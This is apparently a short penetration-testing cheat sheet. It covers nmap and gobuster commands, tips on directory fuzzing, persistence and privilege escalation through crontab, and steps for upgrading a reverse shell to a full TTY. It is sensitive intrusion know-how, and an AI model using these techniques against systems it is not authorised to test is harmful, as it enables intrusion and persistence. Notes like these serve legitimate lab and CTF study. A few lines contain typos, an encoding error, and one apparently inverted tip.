# Enumuration

## NMAP
* *sudo nmap -sC -sV -O -oA \<Output Directory\> \<IP Address\>* - Basic nmap scan for the top ports only. (-sC for default scripts, -sV for version enum, -O for OS enum)
* *sudo nmap -sC -sV -O -p- -oA \<Output Directory\> \<IP Address\>* - Scan for all the ports.
* *nmap --script vuln -oA \<Output Directory\> \<IP Address\>* - Run vulnerability scripts on the target.
* *nmap -sU -oA \<Output Directory\> \<IP Address\>* - Runs a scan for the top UDP ports.

## Fuzzing
* *gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u \<IP Address\>* - You can use another wordlist as well.
* *gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u \<IP Address\> -f* - (-f) is used when the server treats /cgi-bin and /cgi-bin/ differently.
* gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u \<IP Address\>/<Directory>/ -x sh,cgi - Searches for files in a directory and (-x) is used to specify the extension.

## Useful Information

### Useful Information (General)
* Even if you don't have access to a directory you might have access to the files in that directory. (When you get a 403, try fuzzing inside the directory)
* Some servers treat /Directory and /Directory/ differently, the first one might not be accessible but the second might be, make sure to check both when fuzzing.


### Useful Information (Linux)
* Crontab are a list of commands in Linux that are executed on a regular basis. Making it a useful persistent technique and privilege escalation technique.
* If a reverse shell is executed by a specific user, the shell granted will be of that user's privilege. (i.e. if you executed a shell as root, you will get root shell)
* Sometimes even if you can execute a file, you can read/write to it.
* Sometimes even if you aren't root, you can run specific commands with root privilege.

## How to upgrade a shell to a fully interactive TTY.
* *python -c 'import pty; pty.spawn("/bin/bash")'* - Spwans */bin/bash* using Pythonâ€™s PTY module
* *Ctrl + Z* - Background the shell.
* *stty raw -echo && fg* - Upgrade the local terminal with *stty* and foreground the reverse shell.
* *Double Enter*
